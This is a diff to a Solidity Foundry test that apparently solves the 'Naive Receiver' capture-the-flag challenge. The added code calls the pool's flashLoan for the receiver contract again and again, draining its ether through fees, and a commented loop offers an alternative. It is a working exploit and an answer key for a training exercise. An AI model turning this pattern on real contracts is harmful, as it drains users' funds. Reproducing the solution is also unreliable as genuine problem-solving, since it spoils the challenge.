@@ -49,8 +49,15 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
         /** EXPLOIT END **/
+
+        // Alternative and better solution
+        // while (address(flashLoanReceiver).balance > 0) {
+        //     naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        // }
         validation();
     }
 
